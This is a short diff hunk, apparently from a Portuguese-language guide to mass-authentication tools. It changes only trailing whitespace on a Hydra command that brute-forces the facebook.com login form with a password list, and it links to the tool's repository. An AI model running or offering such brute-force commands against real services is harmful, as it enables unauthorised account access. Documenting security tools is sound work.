@@ -37,7 +37,7 @@ Permite realizar autenticações em massa com combinações de usuário e senha.
 
 Exemplo básico de uso com Hydra (web login):
 
-    hydra -l usuário -P senhas.txt facebook.com http-post-form "/login:email=^USER^&pass=^PASS^:F=login_error"
+    hydra -l usuário -P senhas.txt facebook.com http-post-form "/login:email=^USER^&pass=^PASS^:F=login_error"  
 
 https://github.com/vanhauser-thc/thc-hydra
 
